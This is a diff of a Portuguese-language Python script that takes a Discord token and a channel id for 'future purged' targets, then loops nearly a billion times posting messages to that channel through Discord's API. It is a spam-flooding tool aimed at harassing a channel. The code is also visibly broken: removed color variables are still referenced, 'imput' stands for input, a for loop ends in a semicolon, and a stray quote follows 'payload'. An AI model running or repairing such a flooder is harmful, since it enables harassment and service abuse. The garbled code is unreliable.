@@ -5,18 +5,6 @@ import time
 import os
 import sys
 
-# Cores
-red = "\033[91;1m"
-reset = "\033[0m"
-green = "\033[92;1m"
-cyan = "\033[96;1m"
-yellow = "\033[93;1m"
-magenta = "\033[95;1m"
-blue = "\033[94;1m"
-white = "\033[97;1m"
-blink = "\033[5m"
-
-
 print(cyan + """
 
 .                                       ,
@@ -43,23 +31,7 @@ print(cyan + """
 """)
 sleep(5)
 os.system(['clear', 'cls'][os.name == 'int'])
-print(white + """
-                   -=====-                         -=====-
-                _..._                           _..._
-              .~     `~.                     .~`     ~.
-      ,_     /          }                   {          \     _,
-     ,_\'--, \   _.'`~~/                     \~~`'._   / ,--'/_,
-      \'--,_`{_,}    -(                       )-    {,_}`_,--'/
-       '.`-.`\;--,___.'_                     _'.___,--;/`.-`.'
-         '._`/    |_ _{@}                   {@}_ _|    \`_.'
-            /     ` |-';/           _       \;'-| `     \
-           /   \    /  |       _   {@}_      |  \    /   \
-          /     '--;_       _ {@}  _Y{@}        _;--'     \
-         _\          `\    {@}\Y/_{@} Y/      /`          /_
-        / |`-.___.    /    \Y/\|{@}Y/\|//     \    .___,-'| \
-^^jgs^^`--`------'`--`^^^^^^^^^^^^^^^^^^^^^^^^^`--`'------`--`^^^^^^^
-""")
-itoken = imput(yellow + "Mande seu token --->")
+itoken = imput("Mande seu token --->")
 sleep(2)
 os.system(['clear', 'cls'][os.name == 'int'])
 token = itoken # Adicione seu token
@@ -88,8 +60,7 @@ print(white + ""
 
 """)
 print(" ")
-print(" ")
-print(white + "Coloque o id dos futuros expurgados")
+print("Coloque o id dos futuros expurgados")
 channelId = input()
 for _ in range(999999999);
        r = requests.post(f'https://discord.com/api/v8/channels/{channelId}/messages', headers=headers, json=payload')
